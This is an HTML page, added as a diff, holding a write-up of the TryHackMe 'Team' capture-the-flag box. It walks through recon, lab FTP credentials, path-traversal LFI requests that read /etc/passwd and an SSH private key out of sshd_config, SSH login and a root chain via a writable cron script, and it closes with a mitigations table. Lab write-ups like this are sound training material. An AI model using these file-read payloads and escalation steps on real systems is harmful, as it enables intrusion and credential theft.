@@ -1,0 +1,167 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Team — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="robots.txt gave a username, a stale script backup exposed FTP credentials, FTP yielded a subdomain hint, and that subdomain ran a PHP page vulnerable to…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/team.html">
+<meta property="og:title" content="Team — TryHackMe writeup">
+<meta property="og:description" content="robots.txt gave a username, a stale script backup exposed FTP credentials, FTP yielded a subdomain hint, and that subdomain ran a PHP page vulnerable to…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/team.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Team — TryHackMe writeup","description":"robots.txt gave a username, a stale script backup exposed FTP credentials, FTP yielded a subdomain hint, and that subdomain ran a PHP page vulnerable to…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-15","url":"https://thecyberfarhan.github.io/writeups/team.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/team.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>TryHackMe writeup</p>
+  <h1 data-reveal>Team</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Easy</span>
+    <span>June 15, 2026</span>
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b><code>robots.txt</code> gave a username, a stale script backup exposed FTP credentials, FTP yielded a subdomain hint, and that subdomain ran a PHP page vulnerable to LFI. LFI read Dale's SSH private key out of an <code>sshd_config</code> comment. Inside as <code>dale</code>, a <code>sudo</code> rule allowed running <code>gyles</code>'s <code>admin_checks</code> script — which passed unsanitised input directly to the shell, injecting a <code>gyles</code> shell by typing <code>/bin/bash</code> at a date prompt. LinPEAS flagged a root-owned cron script writable by <code>gyles</code>. Appended a reverse shell, waited two minutes, caught root. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">🕷 Feroxbuster</span><span class="chip">📂 FTP client</span><span class="chip">🌐 Browser / curl</span><span class="chip">🐍 LinPEAS</span><span class="chip">🔑 SSH</span><span class="chip">🐚 Netcat</span></div>
+  <h2 data-reveal>Introduction</h2>
+<p>Today's target is <strong>Team</strong> — a box that hides its credentials across four different layers: a <code>robots.txt</code> username, a <code>.old</code> script backup with FTP credentials, an FTP note pointing to a dev subdomain, and an SSH private key buried in an <code>sshd_config</code> comment. Each layer requires reading the output of the previous one carefully rather than throwing tools at it blindly. The escalation chain is equally methodical: a <code>sudo</code> rule with a command injection point, a lateral move to <code>gyles</code>, and a writable cron script completing the run to root. This box rewards patience and attention to detail more than any single clever exploit.</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>What virtual hosts are and why adding entries to <code>/etc/hosts</code> matters</li><li>What LFI (Local File Inclusion) is and how <code>?page=</code> parameters enable file reads</li><li>How SSH private keys can be extracted and used for authentication</li><li>What a cron job is and why a world-writable cron script is a privilege escalation path</li></ul>
+<h2 data-reveal>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<p class="aside">Full-range sweep with RustScan, Nmap for service and version fingerprinting:</p>
+<pre><code>rustscan -a 10.48.187.18 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>21/tcp</td><td>FTP</td><td>vsftpd 3.0.5</td></tr><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.13</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache httpd 2.4.41 (Ubuntu)</td></tr></tbody></table>
+<p>Three ports. FTP and HTTP both worth immediate attention. The HTTP title returns as Apache default — content is elsewhere. Anonymous FTP was blocked immediately on the first connection attempt.</p>
+<h3>Virtual Host Discovery</h3>
+<p>The Apache default page itself contains a hint in the title: *"If you see this add 'team.thm' to your hosts file."* Following that instruction:</p>
+<pre><code>sudo echo "10.48.187.18   team.thm" &gt;&gt; /etc/hosts</code></pre>
+<p>The actual website loaded. <code>robots.txt</code> checked immediately:</p>
+<pre><code>http://team.thm/robots.txt → dale</code></pre>
+<p>Username: <code>dale</code>.</p>
+<h3>Web Directory Enumeration</h3>
+<p class="aside">(~5 mins into the box)</p>
+<pre><code>feroxbuster -u http://team.thm/ \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -x php,txt,html</code></pre>
+
+<pre><code># output (relevant hits only)
+301  http://team.thm/scripts         # ^^^ script directory
+200  http://team.thm/scripts/script.txt</code></pre>
+<p class="aside">Contents of <code>script.txt</code> (redacted version):</p>
+<pre><code>#!/bin/bash
+read -p "Enter Username: " REDACTED
+read -sp "Enter Username Password: " REDACTED
+# ...
+# Note to self had to change the extension of the old "script" in this folder,
+# as it has creds in</code></pre>
+<p>The comment is explicit: there's an older version of this script with credentials, just renamed. The extension was changed — trying <code>.old</code>:</p>
+<pre><code>http://team.thm/scripts/script.old</code></pre>
+<p class="aside">Contents of <code>script.old</code> (relevant section):</p>
+<pre><code>read -p "Enter Username: " ftpuser
+read -sp "Enter Username Password: " T3@m$h@r3</code></pre>
+<p>FTP credentials: <code>ftpuser:T3@m$h@r3</code>.</p>
+<h3>FTP Login  Subdomain Hint</h3>
+<p class="aside">Logging in with the discovered credentials (active mode required):</p>
+<pre><code>ftp 10.48.187.18
+# Name: ftpuser   Password: T3@m$h@r3
+ftp&gt; passive
+ftp&gt; ls -la
+# drwxrwxr-x  workshare/
+ftp&gt; cd workshare &amp;&amp; get New_site.txt</code></pre>
+<p class="aside">Contents of <code>New_site.txt</code>:</p>
+<pre><code>Dale
+    I have started coding a new website in PHP for the team to use,
+    this is currently under development. It can be found at ".dev"
+    within our domain.
+    Also as per the team policy please make a copy of your "id_rsa"
+    and place this in the relevent config file.
+Gyles</code></pre>
+<p>Two key pieces: a <code>dev.team.thm</code> subdomain exists, and Dale's <code>id_rsa</code> was placed in "the relevant config file" — almost certainly <code>sshd_config</code>.</p>
+<pre><code>sudo echo "10.48.187.18   dev.team.thm" &gt;&gt; /etc/hosts</code></pre>
+
+<h2 data-reveal>Foothold</h2>
+<p class="aside">(~20 mins into the box)</p>
+<h3>LFI — Local File Inclusion</h3>
+<p><strong>What is LFI?</strong> When a PHP application accepts a filename via a URL parameter and passes it directly to a file-read function (<code>include()</code>, <code>require()</code>, <code>file_get_contents()</code>) without sanitisation, an attacker can substitute arbitrary paths. The server reads and returns any file the web process can access.</p>
+<p><code>http://dev.team.thm/</code> presents a placeholder page with a single link that navigates to:</p>
+<pre><code>http://dev.team.thm/script.php?page=teamshare.php</code></pre>
+<p>The <code>page=</code> parameter is the LFI vector.</p>
+<p class="aside">Confirming LFI with <code>/etc/passwd</code>:</p>
+<pre><code>http://dev.team.thm/script.php?page=../../../../etc/passwd</code></pre>
+<p>The full <code>/etc/passwd</code> rendered in the response. Users confirmed: <code>dale</code> (uid 1000), <code>gyles</code> (uid 1001), <code>ftpuser</code> (uid 1002).</p>
+<p class="aside">Reading the user flag directly:</p>
+<pre><code>http://dev.team.thm/script.php?page=/home/dale/user.txt</code></pre>
+
+<pre><code>THM{6Y0TXHz7c2d}</code></pre>
+<p class="aside">Reading <code>sshd_config</code> to find Dale's private key (per Gyles's note):</p>
+<pre><code>http://dev.team.thm/script.php?page=/etc/ssh/sshd_config</code></pre>
+<p>At the bottom of the config, commented out:</p>
+<pre><code>#Dale id_rsa
+#-----BEGIN OPENSSH PRIVATE KEY-----
+#b3BlbnNzaC1rZXktdjEAAAA...
+#-----END OPENSSH PRIVATE KEY-----</code></pre>
+<p>The key was saved locally as <code>id_rsa</code> after stripping the leading <code>#</code> comment characters from each line.</p>
+<h2 data-reveal>Shell / Access</h2>
+<p class="aside">(~25 mins into the box)</p>
+<p class="aside">SSH login as <code>dale</code> with the extracted key:</p>
+<pre><code>chmod 600 id_rsa
+ssh -i id_rsa dale@team.thm</code></pre>
+
+<pre><code>dale@ip-10-48-187-18:~$</code></pre>
+
+<h2 data-reveal>The Full Chain</h2>
+<p>The complete attack chain:</p>
+<ol><li><strong><code>robots.txt</code></strong> → username <code>dale</code></li><li><strong><code>/scripts/script.old</code></strong> → FTP credentials <code>ftpuser:T3@m$h@r3</code></li><li><strong>FTP</strong> → <code>New_site.txt</code> → <code>dev.team.thm</code> subdomain + id_rsa config hint</li><li><strong>LFI on <code>dev.team.thm/script.php?page=</code></strong> → confirmed file read primitive</li><li><strong>LFI → <code>/home/dale/user.txt</code></strong> → user flag</li><li><strong>LFI → <code>/etc/ssh/sshd_config</code></strong> → Dale's SSH private key in a comment</li><li><strong>SSH as <code>dale</code></strong> → user shell</li><li><strong><code>sudo -u gyles /home/gyles/admin_checks</code></strong> → shell injection via date input → <code>gyles</code> shell</li><li><strong><code>/usr/local/bin/main_backup.sh</code></strong> writable by <code>editors</code> group, run by root cron → appended reverse shell → root</li></ol>
+<h2 data-reveal>Rabbit Holes</h2>
+<h3>Anonymous FTP Blocked</h3>
+<p>First instinct on seeing port 21 was anonymous login — rejected immediately. The credentials only appeared later via the <code>script.old</code> web discovery path. Trying anonymous first is always correct; failing fast and moving on is equally correct.</p>
+<h3>LFI Wordlist Enumeration</h3>
+<p>A large LFI path wordlist (~160 entries) was run against <code>script.php?page=</code> to probe for sensitive files. Most paths returned empty or error responses. The two productive hits — <code>user.txt</code> and <code>sshd_config</code> — came from targeted manual requests based on what was already known about the box (user <code>dale</code> from <code>robots.txt</code>, the id_rsa hint from <code>New_site.txt</code>), not from the wordlist. The lesson: known context produces better targets than generic wordlists.</p>
+<h2 data-reveal>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Sensitive files accessible via <code>robots.txt</code></td><td>Low</td><td><code>robots.txt</code> is not an access control mechanism — never list paths containing credentials or usernames; use proper authentication</td></tr><tr><td>Backup script with credentials left in web-accessible directory</td><td class="sev-critical">Critical</td><td>Never store backup files or old versions under the webroot; automate cleanup of <code>.old</code>, <code>.bak</code>, <code>.tmp</code> files before deployment</td></tr><tr><td>LFI via unsanitised <code>page=</code> parameter</td><td class="sev-critical">Critical</td><td>Validate <code>page</code> against an explicit allowlist of permitted filenames; never pass raw user input to PHP <code>include()</code> or <code>require()</code></td></tr><tr><td>SSH private key stored in <code>sshd_config</code> comment</td><td class="sev-critical">Critical</td><td>Private keys belong only in <code>~/.ssh/</code>; they should never be pasted into configuration files, comments, or any other location</td></tr><tr><td><code>admin_checks</code> script passing user input to shell unsanitised</td><td class="sev-high">High</td><td>Validate and sanitise all inputs to privileged scripts; avoid passing user-supplied strings as shell arguments or to <code>eval</code></td></tr><tr><td>Root cron script writable by a non-root group</td><td class="sev-critical">Critical</td><td>Cron scripts executed as root must be owned and writable only by root (<code>chmod 700</code>, <code>chown root:root</code>); audit cron jobs regularly</td></tr></tbody></table>
+  <div class="takeaway" data-reveal><b>Key takeaway</b>Virtual host enumeration is an underused but essential step — the entire attack surface of this box was hidden behind a hostname that wouldn't resolve without an <code>/etc/hosts</code> entry. When a target has a domain name associated with it, always check for subdomains and alternative vhosts before concluding the web surface is limited to the IP's default response.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>Check <code>robots.txt</code> and view-source on the homepage *before* running Feroxbuster — both the username and the hint about the scripts directory were immediately available without a scan. Also add the <code>dev.team.thm</code> vhost to <code>/etc/hosts</code> immediately after reading <code>New_site.txt</code> from FTP, rather than finishing FTP exploration first.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/team_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
